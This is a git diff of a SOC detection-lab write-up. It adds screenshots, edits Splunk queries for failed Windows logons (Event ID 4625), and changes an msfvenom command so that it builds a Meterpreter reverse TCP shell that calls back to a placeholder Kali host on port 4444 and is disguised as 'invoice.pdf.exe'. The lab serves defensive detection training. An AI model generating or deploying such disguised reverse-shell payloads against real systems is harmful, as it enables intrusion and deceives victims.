@@ -47,6 +47,10 @@ Multiple failed authentication attempts are made against the Windows machine fro
 
 - **Detection:** Splunk query on Event ID `4625` (An account failed to log on)
 
+<p>
+  <img src="soc-detection-lab/failed_login_4625.png" width="700"/>
+</p>
+
 ```spl
 index=* EventCode=4625
 ```
@@ -65,7 +69,6 @@ Review and triage the authentication alerts generated from steps 1 and 2.
 
 ```spl
 index=* EventCode=4625 earliest=-15m
-| where count >= 5
 ```
 
 ---
@@ -74,10 +77,14 @@ index=* EventCode=4625 earliest=-15m
 A reverse shell payload is generated on the Kali attacker machine using `msfvenom`.
 
 - **Tool:** `msfvenom`
-- **Payload:** Windows reverse TCP shell (`windows/x64/shell_reverse_tcp`)
+- **Payload:** Windows reverse TCP shell (`windows/x64/meterpreter_reverse_tcp`)
+
+<p>
+  <img src="soc-detection-lab/reverse_tcp_creation.png" width="700"/>
+</p>
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp \
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
   LHOST=<KALI_IP> LPORT=4444 \
   -f exe -o invoice.pdf.exe
 ```
